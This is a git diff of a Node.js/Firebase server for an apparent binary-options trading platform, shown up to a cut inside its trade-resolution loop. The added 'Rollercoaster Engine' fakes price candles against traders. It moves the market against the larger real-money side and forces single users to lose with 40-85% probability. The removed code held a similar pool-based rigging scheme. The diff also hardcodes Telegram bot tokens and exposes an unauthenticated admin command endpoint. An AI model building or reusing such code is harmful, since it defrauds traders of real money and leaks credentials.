@@ -1,9 +1,10 @@
-// --- START: main app server.js (v30.4 - Real Market Accurate Candle Proportions) ---
+// --- START: main app server.js (v31.0 - Rollercoaster Engine & Multi-Timeframe) ---
 
 const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
 const cors = require('cors');
+const axios = require('axios');
 const firebase = require('firebase/app');
 require('firebase/database');
 
@@ -33,41 +34,21 @@ const wss = new WebSocket.Server({ server });
 
 // --- SYSTEM CONSTANTS ---
 const TIMEFRAME = 60000; 
-const TICK_MS = 300; // Standard tick
+const TICK_MS = 300; 
 const MIN_PRICE = 0.00001;
 const HISTORY_SEED_COUNT = 100;
 const MAX_CANDLES = 5000;
 
-// 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
+// 🔥 ADMIN SMART SETTINGS 🔥
 const SMART_AUTO_PILOT = true; 
-const ADMIN_WIN_RATIO = 0.80;  
-
-// 🔥 GLOBAL REVENUE POOL SETTINGS 🔥
-const POOL_CONFIG = {
-    ADMIN_SHARE: 0.70,
-    USER_SHARE: 0.30  
-};
-let globalPayoutPool = 0;
-let globalAdminProfit = 0;
 
 const markets = {}; 
 const activeTradesDb = {}; 
 
-db.ref('admin/revenue_pool').on('value', (snapshot) => {
-    const data = snapshot.val() || {};
-    globalPayoutPool = parseFloat(data.payoutPool) || 0;
-    globalAdminProfit = parseFloat(data.adminProfit) || 0;
-});
-
-function updateGlobalPoolInDB(payoutChange, adminChange) {
-    globalPayoutPool += payoutChange;
-    globalAdminProfit += adminChange;
-    if (globalPayoutPool < 0) globalPayoutPool = 0;
-    db.ref('admin/revenue_pool').update({
-        payoutPool: globalPayoutPool,
-        adminProfit: globalAdminProfit
-    }).catch(err => console.error("Pool Update Error:", err));
-}
+// Cache users to make sync decisions in real-time
+const usersCache = {};
+db.ref('users').on('child_added', snap => { usersCache[snap.key] = snap.val(); });
+db.ref('users').on('child_changed', snap => { usersCache[snap.key] = snap.val(); });
 
 function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
 function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
@@ -84,25 +65,19 @@ db.ref('admin/markets').on('value', (snapshot) => {
     });
 });
 
-// 1. Natural Market Generation (100% REAL BROKER PATTERNS)
+// 1. Natural Market Generation
 function generateHistoricalCandle(timestamp, open, isLive = false) {
     const safeOpen = Math.max(MIN_PRICE, open);
     const isGreen = Math.random() > 0.5;
-    
-    // Normal base volatility
     const baseVol = safeOpen * 0.00008; 
-    
     let bodySize, upperWick, lowerWick;
     const rand = Math.random();
 
     if (rand < 0.10) {
-        // 10% Chance: Doji / Spinning Top (Small body, noticeable wicks)
         bodySize = baseVol * (Math.random() * 0.2); 
         upperWick = baseVol * (0.5 + Math.random() * 1.5);
         lowerWick = baseVol * (0.5 + Math.random() * 1.5);
-    } 
-    else if (rand < 0.25) {
-        // 15% Chance: Hammer / Shooting Star (Small/Medium body, one long wick)
+    } else if (rand < 0.25) {
         bodySize = baseVol * (0.3 + Math.random() * 0.6);
         if (Math.random() > 0.5) {
             upperWick = baseVol * (1.5 + Math.random() * 2.5);
@@ -111,15 +86,11 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
             upperWick = baseVol * (Math.random() * 0.3);
             lowerWick = baseVol * (1.5 + Math.random() * 2.5);
         }
-    } 
-    else if (rand < 0.40) {
-        // 15% Chance: Marubozu / Strong trend (Large body, tiny wicks)
+    } else if (rand < 0.40) {
         bodySize = baseVol * (1.5 + Math.random() * 1.5);
         upperWick = baseVol * (Math.random() * 0.2);
         lowerWick = baseVol * (Math.random() * 0.2);
-    } 
-    else {
-        // 60% Chance: Normal Everyday Candle (Good body, standard wicks)
+    } else {
         bodySize = baseVol * (0.6 + Math.random() * 1.0);
         upperWick = baseVol * (0.2 + Math.random() * 0.8);
         lowerWick = baseVol * (0.2 + Math.random() * 0.8);
@@ -129,9 +100,7 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
     const finalHigh = Math.max(safeOpen, close) + upperWick;
     const finalLow = Math.min(safeOpen, close) - lowerWick;
 
-    if (!isLive) {
-        return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };
-    }
+    if (!isLive) return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };
 
     return {
         timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
@@ -140,7 +109,7 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
 }
 
 // 2. Exact Pattern Generator
-function generateDynamicCandle(timestamp, open, command, lastCandle, cloneData) {
+function generateDynamicCandle(timestamp, open, command) {
     let bodySize, upperWick, lowerWick, close, high, low;
     const volatility = open * 0.00008;
 
@@ -149,16 +118,8 @@ function generateDynamicCandle(timestamp, open, command, lastCandle, cloneData) 
             bodySize = volatility * 1.5; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
         case 'RED': 
             bodySize = volatility * 1.5; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
-        case 'BULLISH_MARUBOZU': 
-            bodySize = volatility * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
-        case 'BEARISH_MARUBOZU': 
-            bodySize = volatility * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
         case 'DOJI': 
             bodySize = open * 0.000001; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
-        case 'GREEN_HAMMER': 
-            bodySize = volatility * 0.4; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
-        case 'RED_HAMMER': 
-            bodySize = volatility * 0.4; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
         default: 
             bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
     }
@@ -194,70 +155,100 @@ async function initializeNewMarket(marketId) {
     markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
 }
 
+// 🔥 CORE AI LOGIC: Multi-Timeframe + Rollercoaster Engine 🔥
 function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     let lastCandle = marketData.history[marketData.history.length - 1];
     if (!lastCandle) return null;
 
     if (currentPeriod > lastCandle.timestamp) {
         let newCandle;
+        
+        // Manual Admin Override
         if (marketData.nextCandleCommand) {
-            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, lastCandle, marketData.nextCandleCloneData);
-            newCandle.isAdminCommand = true; 
+            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
             marketData.nextCandleCommand = null;
-            marketData.nextCandleCloneData = null;
         } 
         
+        // Smart Auto Pilot (Rollercoaster & Volume Edge)
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
-            let immediateUpPayout = 0, immediateDownPayout = 0;
+            let totalUp = 0, totalDown = 0;
+            let uniqueUsers = new Set();
+            let singleUserId = null;
+
             const nextPeriod = currentPeriod + TIMEFRAME;
             
+            // Check trades expiring EXACTLY at the end of this current minute
             Object.values(trades).forEach(t => {
-                const isDemo = t.isDemo === true; 
-                const payoutRate = t.payoutRate || 1.85;
-                const expectedPayout = t.amount * payoutRate;
-
-                if (!isDemo && !t.isProcessedForPool) {
-                    const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
-                    const userCut = t.amount * POOL_CONFIG.USER_SHARE;
-                    updateGlobalPoolInDB(userCut, adminCut);
-                    t.isProcessedForPool = true;
-                    db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
-                }
-
-                if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
-                    if (t.direction === 'UP' && !isDemo) immediateUpPayout += expectedPayout;
-                    if (t.direction === 'DOWN' && !isDemo) immediateDownPayout += expectedPayout;
+                const isDemo = t.isDemo === true || t.isTournament === true; 
+                if (!isDemo) {
+                    if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000 && t.expiryTimestamp > currentPeriod) {
+                        uniqueUsers.add(t.uid);
+                        singleUserId = t.uid;
+                        if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
+                        if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
+                    }
                 }
             });
 
-            if (immediateUpPayout > 0 || immediateDownPayout > 0) {
-                let targetDirection = 'DOJI';
-                const canAffordUp = immediateUpPayout <= globalPayoutPool;
-                const canAffordDown = immediateDownPayout <= globalPayoutPool;
+            let targetDirection = 'DOJI';
 
-                if (!canAffordUp && !canAffordDown) targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
-                else if (!canAffordUp) targetDirection = 'RED';
-                else if (!canAffordDown) targetDirection = 'GREEN';
-                else targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
-
-                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection, lastCandle);
-                newCandle.isAdminCommand = false; 
-                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00003); 
-                
-                let payoutChange = 0;
-                let adminProfitChange = 0;
-
-                if (targetDirection === 'GREEN') {
-                    payoutChange = -immediateUpPayout;
-                } else if (targetDirection === 'RED') {
-                    payoutChange = -immediateDownPayout;
-                } 
-
-                if (payoutChange !== 0 || adminProfitChange !== 0) {
-                    updateGlobalPoolInDB(payoutChange, adminProfitChange);
-                }
+            if (uniqueUsers.size === 0) {
+                // No trades expiring now -> Natural Random
+                targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
             } 
+            else if (uniqueUsers.size > 1) {
+                // Multi-User -> Volume Edge (Kill the bigger volume)
+                if (totalUp > totalDown) targetDirection = 'RED';
+                else if (totalDown > totalUp) targetDirection = 'GREEN';
+                else targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
+            } 
+            else if (uniqueUsers.size === 1) {
+                // Single User -> Rollercoaster Trail Logic
+                const uData = usersCache[singleUserId];
+                let forceLoss = false;
+                let lossProbability = 0.65; // Default
+
+                if (uData && uData.tradeTrail) {
+                    const trail = uData.tradeTrail;
+                    const currentBal = uData.realBalance || 0;
+                    const potentialWinBal = currentBal + ((totalUp + totalDown) * 0.85);
+
+                    if (trail.isUnder65) {
+                        if (trail.phase === 1) { 
+                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
+                        } else if (trail.phase === 2) { lossProbability = 0.80; } 
+                        else if (trail.phase === 3) { 
+                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
+                        } else if (trail.phase === 4) { lossProbability = 0.85; }
+                    } else {
+                        if (trail.phase === 1) { lossProbability = 0.80; } 
+                        else if (trail.phase === 2) { 
+                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
+                        } else if (trail.phase === 3) { lossProbability = 0.80; } 
+                        else if (trail.phase === 4) { 
+                            if (potentialWinBal > trail.targetBalance) forceLoss = true; else lossProbability = 0.40; 
+                        } else if (trail.phase === 5) { lossProbability = 0.85; }
+                    }
+                } else {
+                    // Fallback to basic PnL tracking if trail isn't created yet
+                    let dp = (uData && uData.dailyProfit) ? uData.dailyProfit : 0;
+                    if (dp > 20) lossProbability = 0.85;
+                    else if (dp > 0) lossProbability = 0.75;
+                    else if (dp < -100) lossProbability = 0.35;
+                    else if (dp < -50) lossProbability = 0.50;
+                    else lossProbability = 0.65;
+                }
+
+                if (!forceLoss) forceLoss = Math.random() < lossProbability;
+
+                const userPrimaryDirection = totalUp > totalDown ? 'UP' : 'DOWN';
+                targetDirection = forceLoss ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
+            }
+
+            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
+            newCandle.isAdminCommand = false; 
+            newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00003); 
         }
         
         if (!newCandle) {
@@ -271,6 +262,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     return lastCandle;
 }
 
+// 3. Smooth Tick Generator
 function updateRealisticPrice(marketData, candle, currentPeriod) {
     if (!candle.isPredetermined) return;
 
@@ -308,7 +300,6 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
 
     marketData.currentPrice = idealPrice + noise;
     
-    // 🔥 EXACT 60s CLOSE: Only jump to target close right at the end
     if (timeElapsed >= TIMEFRAME - 200) {
         marketData.currentPrice = candle.targetClose;
     } else {
@@ -354,20 +345,16 @@ app.get('/api/history/:marketId', (req, res) => {
 });
 
 app.post('/api/admin/command', (req, res) => {
-    const { marketId, command, cloneData } = req.body;
-    if (!marketId || !command) {
-        return res.status(400).json({ error: 'Missing marketId or command' });
-    }
+    const { marketId, command } = req.body;
     if (markets[marketId]) {
         markets[marketId].nextCandleCommand = command;
-        if (cloneData) markets[marketId].nextCandleCloneData = cloneData;
-        res.json({ success: true, message: `Command ${command} received` });
+        res.json({ success: true });
     } else {
-        res.status(404).json({ error: 'Market not found on server' });
+        res.status(404).json({ error: 'Market not found' });
     }
 });
 
-// Main Loop
+// Main Ticker Loop
 let lastSyncTime = 0;
 setInterval(() => {
     const now = Date.now();
@@ -395,266 +382,108 @@ setInterval(() => {
     }
 }, TICK_MS);
 
-// ==========================================
-// 🔥 TELEGRAM 2FA BOT SYSTEM 🔥 (Unchanged)
-// ==========================================
-const https = require('https');
-const TELEGRAM_BOT_TOKEN = "8740566281:AAF7MUaumUIrO7IJ7Hr93kG0EzOOHvr444U";
-let lastUpdateId = 0;
 
-function sendTelegramMessage(chatId, text) {
-    return new Promise((resolve) => {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const payload = JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' });
-        const req = https.request(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
-        }, (res) => {
-            let body = '';
-            res.on('data', chunk => body += chunk);
-            res.on('end', () => {
-                try {
-                    const data = JSON.parse(body);
-                    if (data.ok && data.result) resolve(data.result.message_id);
-                    else resolve(null);
-                } catch (e) { resolve(null); }
-            });
-        });
-        req.on('error', () => resolve(null));
-        req.write(payload);
-        req.end();
-    });
-}
-function deleteTelegramMessage(chatId, messageId) {
-    if (!messageId) return;
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
-    const payload = JSON.stringify({ chat_id: chatId, message_id: messageId });
-    const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }});
-    req.on('error', () => {}); req.write(payload); req.end();
-}
-const activeLinkingSessions = {};
-const activeSupportSessions = {};
-const adminSupportMap = {}; 
-const ADMIN_OWNER_ID = "7504616242"; 
+// =====================================================================
+// SERVER-SIDE TRADE RESOLUTION & TELEGRAM NOTIFICATION ENGINE
+// =====================================================================
+const TELEGRAM_BOT_TOKEN = "8031969785:AAFYcw6HN9kL0oG4JxoU3NKEHvPsxqVSg-I";
+const TELEGRAM_CHAT_ID = "7504616242";
 
-function forwardTelegramMessage(toChatId, fromChatId, messageId) {
-    return new Promise((resolve) => {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/forwardMessage`;
-        const payload = JSON.stringify({ chat_id: toChatId, from_chat_id: fromChatId, message_id: messageId });
-        const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } }, (res) => {
-            let body = ''; res.on('data', chunk => body += chunk);
-            res.on('end', () => { try { const data = JSON.parse(body); resolve(data.ok && data.result ? data.result.message_id : null); } catch (e) { resolve(null); } });
-        });
-        req.on('error', () => resolve(null)); req.write(payload); req.end();
-    });
+async function sendTgMessage(text, replyToId = null) {
+    try {
+        const payload = { chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' };
+        if (replyToId) payload.reply_to_message_id = replyToId;
+        const res = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
+        return res.data.result.message_id;
+    } catch (e) { console.log("TG Error:", e.message); return null; }
 }
 
-function pollTelegramUpdates() {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-    const req = https.get(url, (res) => {
-        let body = ''; res.on('data', chunk => body += chunk);
-        res.on('end', async () => {
-            try {
-                const response = JSON.parse(body);
-                if (response.ok && response.result.length > 0) {
-                    for (const update of response.result) {
-                        lastUpdateId = update.update_id;
-                        if (update.message) {
-                            const msgDate = update.message.date || 0;
-                            const nowSec = Math.floor(Date.now() / 1000);
-                            if (msgDate < nowSec - 60) continue;
-
-                            const text = update.message.text ? update.message.text.trim() : "";
-                            const chatId = String(update.message.chat.id);
-                            const textLower = text.toLowerCase();
-                            
-                            if (chatId === ADMIN_OWNER_ID && update.message.reply_to_message) {
-                                const replyToId = update.message.reply_to_message.message_id;
-                                const targetUserId = adminSupportMap[replyToId];
-                                if (targetUserId && text) await sendTelegramMessage(targetUserId, `💬 *Response from Support:* \n\n${text}`);
-                                continue;
-                            }
-
-                            if (textLower === '/start') {
-                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\nPlease end the active session first using /endhelp.`); continue; }
-                                await sendTelegramMessage(chatId, `✨ *WELCOME TO ICTEX SECURE GATEWAY* ✨\n\nHello Trader! I am the official ICTEX Security and 2FA Bot.\n\n*Available Commands:*\n🔑 /linkictex - Link account securely.\n👤 /accounts - View linked profiles.\n💬 /help - Open a direct support session.`);
-                            } 
-                            else if (textLower === '/linkictex') {
-                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ Please end the active help session first using /endhelp.`); continue; }
-                                if (activeLinkingSessions[chatId]) {
-                                    clearTimeout(activeLinkingSessions[chatId].timeoutRef);
-                                    if (activeLinkingSessions[chatId].linkMessageId) deleteTelegramMessage(chatId, activeLinkingSessions[chatId].linkMessageId);
-                                }
-                                const linkMessageId = await sendTelegramMessage(chatId, `🔑 *ICTEX Secure Account Link Initiation*\nPlease go to your **ICTEX Trading Terminal -> Profile Settings**, copy your 15-digit secure linking code, and paste it here.\n\n*Code format:* \`XXXXX - XXXXX - XXXXX\``);
-                                activeLinkingSessions[chatId] = {
-                                    linkMessageId: linkMessageId,
-                                    expiresAt: Date.now() + 60000,
-                                    timeoutRef: setTimeout(async () => {
-                                        if (linkMessageId) deleteTelegramMessage(chatId, linkMessageId);
-                                        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ *Linking Session Expired*\nYour 1-minute account linking session has expired. Type /linkictex to start again.`);
-                                        setTimeout(() => { if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000);
-                                        delete activeLinkingSessions[chatId];
-                                    }, 60000)
-                                };
-                            }
-                            else if (textLower === '/help') {
-                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ You are already in an active support session.`); continue; }
-                                activeSupportSessions[chatId] = { active: true, isFirstMessage: true };
-                                await sendTelegramMessage(chatId, `💬 *ICTEX Help Desk Started*\nYou are now connected to the Support Desk. Please describe your problem in detail.\n\n🔒 _Tap /endhelp to close the session._`);
-                            }
-                            else if (textLower === '/endhelp' || textLower === '/end') {
-                                if (activeSupportSessions[chatId]) {
-                                    delete activeSupportSessions[chatId];
-                                    await sendTelegramMessage(chatId, `🔒 *SUPPORT SESSION CLOSED*`);
-                                }
-                            }
-                            else {
-                                if (activeSupportSessions[chatId] && activeSupportSessions[chatId].active) {
-                                    if (activeSupportSessions[chatId].isFirstMessage) {
-                                        activeSupportSessions[chatId].isFirstMessage = false;
-                                        await sendTelegramMessage(chatId, `Please wait, our support agents will contact you shortly.`);
-                                    }
-                                    const forwardedId = await forwardTelegramMessage(ADMIN_OWNER_ID, chatId, update.message.message_id);
-                                    if (forwardedId) adminSupportMap[forwardedId] = chatId;
-                                }
-                                else {
-                                    const session = activeLinkingSessions[chatId];
-                                    if (session && Date.now() < session.expiresAt) {
-                                        const codeMatch = text.match(/[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}/);
-                                        if (codeMatch) {
-                                            const linkCode = codeMatch[0].toUpperCase();
-                                            const linkSnap = await db.ref(`telegram_links/${linkCode}`).once('value');
-                                            if (linkSnap.exists()) {
-                                                const uid = linkSnap.val().uid;
-                                                await db.ref(`users/${uid}`).update({ telegramChatId: chatId, twoFactorEnabled: true });
-                                                await linkSnap.ref.remove();
-                                                clearTimeout(session.timeoutRef);
-                                                if (session.linkMessageId) deleteTelegramMessage(chatId, session.linkMessageId);
-                                                delete activeLinkingSessions[chatId];
-                                                await sendTelegramMessage(chatId, `🎉 *ACCOUNT PAIRED SUCCESSFULLY!* 🎉\nYour Telegram profile is now fully bound to your ICTEX Trading Account.`);
-                                            } else {
-                                                await sendTelegramMessage(chatId, `❌ *PAIRING ATTEMPT FAILED*\nThe linking code is invalid or expired.`);
-                                            }
-                                        } 
-                                    } 
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch(e) {}
-            setTimeout(pollTelegramUpdates, 1000); 
-        });
-    }).on('error', () => { setTimeout(pollTelegramUpdates, 3000); });
-}
-
-function deleteTelegramWebhook() {
-    https.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`, (res) => {
-        res.resume(); pollTelegramUpdates();
-    }).on('error', () => { pollTelegramUpdates(); });
-}
-deleteTelegramWebhook();
-
-const activeOtps = {};
-async function handleNewOtp(uid, chatId, otp, userName) {
-    if (activeOtps[uid]) {
-        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
-        if (activeOtps[uid].otpMessageId) deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
-        delete activeOtps[uid];
-    }
-    const otpMessageId = await sendTelegramMessage(chatId, `🔐 *ICTEX VIP Security Alert*\n\nHello *${userName}*,\nYour code is: \`${otp.code}\`\n\n_Expires in 60s._`);
-    activeOtps[uid] = { code: otp.code, chatId, otpMessageId, expiresAt: otp.expiresAt, timeoutRef: setTimeout(async () => {
-        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ Code expired.`);
-        setTimeout(() => { if (otpMessageId) deleteTelegramMessage(chatId, otpMessageId); if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000); 
-        db.ref(`users/${uid}/pendingOTP`).remove().catch(() => {});
-        delete activeOtps[uid];
-    }, 60000) };
-}
-db.ref('users').on('child_changed', (snap) => {
-    const user = snap.val();
-    if (user && user.pendingOTP && user.telegramChatId) {
-        if (!activeOtps[snap.key] || activeOtps[snap.key].code !== user.pendingOTP.code) handleNewOtp(snap.key, user.telegramChatId, user.pendingOTP, user.name || 'User');
-    } else if (user && !user.pendingOTP && activeOtps[snap.key]) {
-        if (activeOtps[snap.key].timeoutRef) clearTimeout(activeOtps[snap.key].timeoutRef);
-        if (activeOtps[snap.key].otpMessageId) deleteTelegramMessage(activeOtps[snap.key].chatId, activeOtps[snap.key].otpMessageId);
-        delete activeOtps[snap.key];
-    }
-});
-
-// ==========================================
-// 🔥 ULTIMATE ARBITER: Trade Resolution Engine 🔥
-// ==========================================
+// Scanner Loop (Resolves trades securely from Server to handle offline users)
 setInterval(async () => {
     const now = Date.now();
-    const allMarketUpdates = {};
-
-    for (const marketId in markets) {
-        const marketData = markets[marketId];
-        const trades = activeTradesDb[marketId] || {};
-
-        for (const tradeId in trades) {
-            const trade = trades[tradeId];
-
-            if (trade.expiryTimestamp && now >= trade.expiryTimestamp && now < trade.expiryTimestamp + 60000) {
+    try {
+        const usersSnap = await db.ref('users').once('value');
+        if (!usersSnap.exists()) return;
+        
+        const users = usersSnap.val();
+        
+        for (const uid in users) {
+            const user = users[uid];
+            if (!user.activeTrades) continue;
+            
+            for (const tradeId in user.activeTrades) {
+                const trade = user.activeTrades[tradeId];
                 
-                const historyCheckSnap = await db.ref(`users/${trade.uid}/tradeHistory/${trade.id}`).once('value');
-                if (historyCheckSnap.exists()) {
-                    if (!allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`]) allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
-                    if (!allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`]) allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
-                    continue;
+                // 1. Send opening message to Telegram
+                if (!trade.tgMessageId && !trade.isDemo && !trade.isTournament) {
+                    let expectedBal = (user.realBalance || 0) - trade.realAmount;
+                    let expWinBal = expectedBal + (trade.amount * (trade.payoutRate || 1.85));
+                    
+                    const msg = `🟢 <b>New Trade Opened</b>\n\n` +
+                                `👤 <b>Name:</b> ${user.name}\n` +
+                                `🆔 <b>UID:</b> ${uid}\n` +
+                                `📈 <b>Market:</b> ${trade.market}\n` +
+                                `⏱ <b>Duration:</b> ${trade.expiryType === 'time' ? trade.expiryType : 'Seconds'}\n` +
+                                `📊 <b>Direction:</b> ${trade.direction}\n` +
+                                `💵 <b>Amount:</b> $${trade.amount}\n` +
+                                `💰 <b>Current Balance:</b> $${(user.realBalance || 0).toFixed(2)}\n\n` +
+                                `🎯 <b>Expected Result:</b> Pending Calculation\n` +
+                                `💸 <b>Balance if Win:</b> $${expWinBal.toFixed(2)}\n` +
+                                `💸 <b>Balance if Loss:</b> $${expectedBal.toFixed(2)}`;
+                    
+                    const msgId = await sendTgMessage(msg);
+                    if (msgId) await db.ref(`users/${uid}/activeTrades/${tradeId}/tgMessageId`).set(msgId);
                 }
 
-                let closingPrice = marketData.currentPrice;
-                if (closingPrice === null || typeof closingPrice !== 'number') continue;
-
-                let result, payout, profitChange;
-                const betAmount = parseFloat(trade.amount);
-                const openPrice = parseFloat(trade.openPrice);
-                const payoutRate = parseFloat(trade.payoutRate) || 1.85;
-
-                const priceDifference = closingPrice - openPrice;
-                const pricePrecision = MIN_PRICE / 10;
-
-                if (Math.abs(priceDifference) < pricePrecision) {
-                    result = 'push';
-                    payout = betAmount;
-                    profitChange = 0;
-                } else if ((priceDifference > 0 && trade.direction === 'UP') || (priceDifference < 0 && trade.direction === 'DOWN')) {
-                    result = 'win';
-                    payout = betAmount * payoutRate;
-                    profitChange = payout - betAmount;
-                } else {
-                    result = 'loss';
-                    payout = 0;
-                    profitChange = -betAmount;
-                }
-                
-                const historyEntry = { ...trade, closePrice: closingPrice, result, payout };
-                allMarketUpdates[`users/${trade.uid}/tradeHistory/${trade.id}`] = historyEntry;
-                allMarketUpdates[`tradeResults/${trade.uid}/${trade.id}`] = { result, pnl: profitChange, amount: betAmount, market: trade.market };
-
-                if (!trade.isDemo && !trade.isTournament) {
-                    if (result === 'win') {
-                        allMarketUpdates[`users/${trade.uid}/realBalance`] = firebase.database.ServerValue.increment(payout);
-                    } else if (result === 'push') {
-                        allMarketUpdates[`users/${trade.uid}/realBalance`] = firebase.database.ServerValue.increment(trade.realAmount);
-                        allMarketUpdates[`users/${trade.uid}/bonusBalance`] = firebase.database.ServerValue.increment(trade.bonusAmount);
+                // 2. Resolve Trade upon expiry
+                if (now >= trade.expiryTimestamp) {
+                    const marketPath = trade.marketId ? trade.marketId.replace(/[\.\/ ]/g, '-').toLowerCase() : trade.market.replace(/[\.\/ ]/g, '-').toLowerCase();
+                    const candleSnap = await db.ref(`markets/${marketPath}/candles/60s`).orderByKey().endAt(String(trade.expiryTimestamp)).limitToLast(1).once('value');
+                    
+                    let closingPrice = trade.openPrice;
+                    if (candleSnap.exists()) {
+                        closingPrice = Object.values(candleSnap.val())[0].close;
                     }
-                    allMarketUpdates[`users/${trade.uid}/totalProfitLoss`] = firebase.database.ServerValue.increment(profitChange);
-                    allMarketUpdates[`users/${trade.uid}/dailyProfit`] = firebase.database.ServerValue.increment(profitChange);
-                }
+                    
+                    const betAmount = parseFloat(trade.amount);
+                    const diff = closingPrice - trade.openPrice;
+                    
+                    let result = 'push', payout = betAmount, profitChange = 0;
+                    if (Math.abs(diff) < 1e-6) {
+                        result = 'push';
+                    } else if ((diff > 0 && trade.direction === 'UP') || (diff < 0 && trade.direction === 'DOWN')) {
+                        result = 'win'; payout = betAmount * (trade.payoutRate || 1.85); profitChange = payout - betAmount;
+                    } else {
+                        result = 'loss'; payout = 0; profitChange = -betAmount;
+                    }
 
-                allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
-                allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
+                    // Batch DB Updates
+                    const updates = {};
+                    if (!trade.isDemo && !trade.isTournament) {
+                        updates[`users/${uid}/realBalance`] = db.ServerValue.increment(result === 'win' ? profitChange + trade.realAmount : (result === 'push' ? trade.realAmount : 0));
+                        updates[`users/${uid}/totalProfitLoss`] = db.ServerValue.increment(profitChange);
+                        updates[`users/${uid}/dailyProfit`] = db.ServerValue.increment(profitChange);
+                    }
+
+                    updates[`users/${uid}/activeTrades/${tradeId}`] = null;
+                    updates[`admin/markets/${trade.marketId}/activeTrades/${tradeId}`] = null;
+                    
+                    const historyEntry = { ...trade, closePrice: closingPrice, payout, result, timestamp: Date.now() };
+                    updates[`users/${uid}/tradeHistory/${tradeId}`] = historyEntry;
+
+                    await db.ref().update(updates);
+
+                    // Send Final Result Reply to Telegram
